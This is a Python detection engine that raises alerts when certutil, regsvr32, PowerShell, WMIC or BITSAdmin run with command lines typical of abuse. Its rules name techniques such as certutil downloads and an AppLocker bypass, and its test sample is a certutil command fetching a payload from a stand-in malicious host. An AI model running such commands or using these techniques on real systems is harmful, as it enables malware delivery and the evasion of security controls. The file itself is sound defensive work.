import logging
import re
from datetime import datetime

class Rule:
    def __init__(self, name, description, lolbin, pattern, severity=1):
        """
        Initialize a detection rule
        
        Args:
            name (str): Name of the rule
            description (str): Description of the suspicious activity
            lolbin (str): Target LOLBin binary name
            pattern (str): Regex pattern to match in command line
            severity (int): Severity level (1-5, with 5 being most severe)
        """
        self.name = name
        self.description = description
        self.lolbin = lolbin.lower()
        self.pattern = re.compile(pattern, re.IGNORECASE)
        self.severity = severity

class RuleEngine:
    def __init__(self):
        """Initialize the rule engine with predefined rules"""
        self.rules = []
        self._initialize_rules()
        logging.info(f"Rule Engine initialized with {len(self.rules)} rules")
    
    def _initialize_rules(self):
        """Create default detection rules for common LOLBins techniques"""
        # Certutil misuse for downloading files
        self.rules.append(
            Rule(
                name="CertUtil Download",
                description="CertUtil used to download files from internet",
                lolbin="certutil.exe",
                pattern=r"(urlcache|-urlcache|-f|-split|-encode|-decode)",
                severity=4
            )
        )
        
        # Regsvr32 AppLocker bypass
        self.rules.append(
            Rule(
                name="Regsvr32 AppLocker Bypass",
                description="Regsvr32 used to bypass AppLocker",
                lolbin="regsvr32.exe",
                pattern=r"(/s|/u|/i:|scrobj.dll|regsvr32.*\.sct)",
                severity=5
            )
        )
        
        # PowerShell encoded commands
        self.rules.append(
            Rule(
                name="PowerShell Encoded Command",
                description="PowerShell executing encoded commands",
                lolbin="powershell.exe",
                pattern=r"(-e|-enc|-encodedcommand)",
                severity=4
            )
        )
        
        # WMIC process call create
        self.rules.append(
            Rule(
                name="WMIC Process Creation",
                description="WMIC used to create process",
                lolbin="wmic.exe",
                pattern=r"(process call create|process.*start)",
                severity=3
            )
        )
        
        # BITSAdmin file transfer
        self.rules.append(
            Rule(
                name="BITSAdmin File Transfer",
                description="BITSAdmin used for file transfer",
                lolbin="bitsadmin.exe",
                pattern=r"(transfer|create|addfile|setnotifycmdline|createandsettransferpreliminaries)",
                severity=3
            )
        )
    
    def analyze_process(self, process_info):
        """
        Analyze a process against detection rules
        
        Args:
            process_info (dict): Process information from process monitor
            
        Returns:
            list: List of triggered rules and their details
        """
        results = []
        process_name = process_info.get('name', '').lower()
        cmdline = ' '.join(process_info.get('cmdline', []))
        
        # Check each rule
        for rule in self.rules:
            if process_name == rule.lolbin:
                if rule.pattern.search(cmdline):
                    alert = {
                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        'rule_name': rule.name,
                        'description': rule.description,
                        'severity': rule.severity,
                        'process_name': process_name,
                        'command_line': cmdline,
                        'pid': process_info.get('pid'),
                        'username': process_info.get('username')
                    }
                    logging.warning(f"Rule triggered: {rule.name} (Severity: {rule.severity})")
                    results.append(alert)
        
        return results

# For testing
if __name__ == "__main__":
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    # Test the rule engine
    engine = RuleEngine()
    
    # Test a suspicious process
    test_process = {
        'name': 'certutil.exe',
        'cmdline': ['certutil.exe', '-urlcache', '-f', 'http://malicious.com/payload.exe', 'C:\\temp\\harmless.exe'],
        'pid': 1234,
        'username': 'test_user'
    }
    
    results = engine.analyze_process(test_process)
    
    if results:
        print(f"Alert: {len(results)} rules triggered!")
        for alert in results:
            print(f"Rule: {alert['rule_name']} (Severity: {alert['severity']})")
            print(f"Description: {alert['description']}")
            print(f"Command: {alert['command_line']}")
            print("---")
    else:
        print("No suspicious activity detected")